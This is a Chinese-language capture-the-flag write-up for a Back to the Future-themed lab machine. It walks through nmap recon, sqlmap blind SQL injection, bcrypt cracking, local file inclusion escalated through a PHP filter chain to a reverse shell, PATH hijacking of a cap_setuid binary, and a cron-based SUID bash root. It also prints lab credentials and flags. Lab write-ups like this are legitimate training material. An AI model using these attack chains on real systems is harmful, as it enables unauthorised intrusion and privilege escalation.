# 一、信息收集

## 1.1 主机发现

首先，使用`arp-scan`工具扫描本地网络，寻找目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:b0:b9:32       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.142`。

## 1.2 端口扫描

使用`nmap`对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.142
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
...
```

扫描结果显示，主机开放了FTP(21)、SSH(22)、HTTP(80)和MySQL(3306)四个端口。

#### 1.3 服务探测

逐一排查已发现的服务：

*   **FTP (21)**: 尝试匿名登录，被拒绝。
*   **SSH (22)**: 尝试使用`hydra`进行密码爆破，被目标服务器拒绝，错误信息显示不支持密码认证，这暗示需要使用密钥登录。
*   **MySQL (3306)**: 尝试使用`root`用户远程连接，被拒绝，错误信息显示攻击机IP不在允许连接的列表中。
*   **HTTP (80)**: 访问80端口，页面自动跳转到域名 `hillvalley.thl`。

# 二、Web渗透

## 2.1 域名配置与信息发掘

根据跳转信息，编辑本地`/etc/hosts`文件，将域名`hillvalley.thl`指向目标IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                                                                                 
192.168.205.142 hillvalley.thl
```

访问`http://hillvalley.thl`，发现一个以“时间旅行日志”为主题的登录页面。查看页面源代码，发现一条有趣的西班牙语注释：`<!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->` (钟楼跟这事没关系！真的吗？)，这是靶机主题的暗示。

## 2.2 SQL注入漏洞利用

面对登录框，首先尝试进行SQL注入。使用`sqlmap`工具自动化检测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://hillvalley.thl/" --batch --forms
...
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
...
```

`sqlmap`确认了`username`参数存在基于时间的SQL盲注。随后，利用此漏洞dump数据库信息。

```bash
# 获取数据库
sqlmap -u "http://hillvalley.thl/" --batch --forms --dbs
# ...
[*] hillvalley
[*] information_schema

# 获取表
sqlmap -u "http://hillvalley.thl/" --batch --forms -D hillvalley --tables
# ...
+-------+
| users |
+-------+

# dump数据
sqlmap -u "http://hillvalley.thl/" --batch --forms -D hillvalley -T users --dump
# ...
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |
+----+--------------------------------------------------------------+----------+
```

成功获取到用户`marty`的密码哈希。

## 2.3 哈希破解

使用`John the Ripper`和`rockyou.txt`字典对获取的bcrypt哈希进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > hash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
andromeda        (?)     
...
```

破解得到密码为`andromeda`。

# 三、初始访问 (Initial Access)

## 3.1 漏洞组合获取Webshell

尝试使用`marty:andromeda`通过SSH登录，但因服务器配置为公钥认证而失败。

回到Web应用，使用破解的凭据`marty:andromeda`成功登录后台。登录后发现URL结构为`http://hillvalley.thl/admin.php?page=about.php`，这极有可能存在本地文件包含（LFI）漏洞。

尝试读取`/etc/passwd`文件：

```
http://hillvalley.thl/admin.php?page=../../../../etc/passwd
```

页面成功回显了文件内容，证实了LFI漏洞的存在。接下来，利用`php://filter`配合`php_filter_chain_generator`工具生成payload，绕过限制执行PHP代码。

> **知识点补充**: `php://filter`是PHP中一个强大的封装协议，它允许在读取文件时对其内容进行过滤和处理。`php_filter_chain_generator`工具可以生成一系列复杂的`iconv`编码转换链，利用特定PHP版本中的bug，最终导致任意代码执行。
>
> **工具链接**:https://github.com/synacktiv/php_filter_chain_generator

成功生成反弹shell的payload并执行，在本地Kali上使用`nc`监听，获得了`www-data`用户的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 45106
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 四、权限提升 (Privilege Escalation)

## 4.1 横向移动：www-data -> marty

在`www-data`的shell中，查看Web目录下的`config.php`文件，发现了数据库的硬编码凭据。

```bash
www-data@hillvalley:/var/www/project/app$ cat config.php 
<?php
$host = "localhost";
$user = "marty";
$pass = "t1m3travel";
$db = "hillvalley";
...
?>
```

发现用户`marty`的另一个密码`t1m3travel`。使用此密码成功从`www-data`切换到`marty`用户。

```bash
www-data@hillvalley:/var/www/project/app$ su marty
Password: 
marty@hillvalley:/var/www/project/app$ id
uid=1001(marty) gid=1001(marty) groups=1001(marty)
```

在`marty`的主目录下，找到并读取了`user.txt`，获得第一个flag。

## 4.2 横向移动：marty -> docbrown

作为`marty`用户，开始寻找进一步提权的方法。`sudo -l`显示没有sudo权限。在主目录下发现一个属于`docbrown`用户的笔记文件`.flux_notes`，内容为`Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.` (不稳定的时期... 我仍然需要为下一次测试修复runner。)，暗示存在一个名为"runner"的程序。

使用`getcap`命令检查系统文件的Linux Capabilities，发现了一个关键配置：

```bash
marty@hillvalley:~$ getcap -r / 2>/dev/null
/usr/local/bin/backup_runner cap_setuid=ep
...
```

> **知识点补充**: Linux Capabilities将root用户的特权分解为更小的单元。`cap_setuid=ep`表示`/usr/local/bin/backup_runner`这个程序拥有任意设置进程UID的能力，这是非常强大的权限。

使用`strings`命令分析`backup_runner`，发现它会调用`tar`命令，并且没有使用绝对路径。

```bash
marty@hillvalley:~$ strings /usr/local/bin/backup_runner
...
Usage: backup_runner <filename>
tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs
...
```

这构成了一个典型的`$PATH`劫持漏洞。通过在`/tmp`目录下创建一个恶意的`tar`脚本，并将其路径添加到`$PATH`环境变量的最前面，可以劫持`backup_runner`的执行流。

```bash
marty@hillvalley:~$ cd /tmp
marty@hillvalley:/tmp$ echo '#!/bin/bash' > tar
marty@hillvalley:/tmp$ echo '/bin/bash -p' >> tar
marty@hillvalley:/tmp$ chmod +x tar
marty@hillvalley:/tmp$ export PATH=/tmp:$PATH
marty@hillvalley:/tmp$ /usr/local/bin/backup_runner x
docbrown@hillvalley:/tmp$ id
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
```

执行后，成功切换为`docbrown`用户。

## 4.3 最终提权：docbrown -> root

作为`docbrown`用户，再次执行`sudo -l`检查权限。

```bash
docbrown@hillvalley:/tmp$ sudo -l
...
User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

发现`docbrown`可以免密以`root`身份运行`/usr/local/bin/time_daemon`。尝试执行该程序，得到报错信息：

```bash
docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

程序试图访问`/tmp/sync`文件。这与之前在`marty`用户下发现的`crontab`条目联系了起来：

```bash
marty@hillvalley:~$ cat /etc/crontab
...
* * * * * root /usr/local/bin/flux_admin.sh
marty@hillvalley:~$ ls -al /usr/local/bin/flux_admin.sh
ls: cannot access '/usr/local/bin/flux_admin.sh': No such file or directory
marty@hillvalley:~$ ls -al /usr/local/bin/
total 40
drwxr-xr-x  2 root root  4096 Jul 14 21:53 .
drwxr-xr-x 10 root root  4096 Jul 11 21:56 ..
-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner
-rwx------  1 root root 16296 Jul 14 20:44 time_daemon
```

定时任务每分钟都以`root`权限执行一个当时还不存在的脚本`/usr/local/bin/flux_admin.sh`。这里的提权思路是：猜测`time_daemon`会复制`/tmp/sync`去`flux_admin.sh`

1. **创建Payload**：在`/tmp`目录下创建`sync`文件，内容是我们的提权命令。

```bash
docbrown@hillvalley:/home/docbrown$ echo '#!/bin/bash' > /tmp/sync
docbrown@hillvalley:/home/docbrown$ echo 'chmod +s /bin/bash' >> /tmp/sync
    docbrown@hillvalley:/home/docbrown$ chmod +x /tmp/sync
```

2. **触发文件写入**：以`root`权限执行`time_daemon`。该程序会读取`/tmp/sync`的内容，并将其写入到`/usr/local/bin/flux_admin.sh`中。

   ```bash
   docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
   [88MPH] Sincronización completada. Listo para viajar.
   ```

3. **等待Cron Job执行**：等待最多一分钟，`crontab`中的定时任务会自动以`root`权限执行`/usr/local/bin/flux_admin.sh`，从而为`/bin/bash`添加SUID权限位。

4. **获取Root Shell**：检查`/bin/bash`权限，确认SUID位已设置后，执行`bash -p`获取root权限。

   ```bash
   docbrown@hillvalley:/home/docbrown$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
   docbrown@hillvalley:/home/docbrown$ bash -p
   bash-5.2# id
   uid=1000(docbrown) gid=1001(marty) euid=0(root) egid=0(root) groups=0(root),1001(marty)
   ```

5. **读取最终Flag**：

   ```bash
   bash-5.2# cat /root/root.txt /home/marty/user.txt 
   FLAG{1.21_gigawatts_of_root_power}
   FLAG{D3_L0r34n}
   ```

成功提权至`root`，渗透测试完成。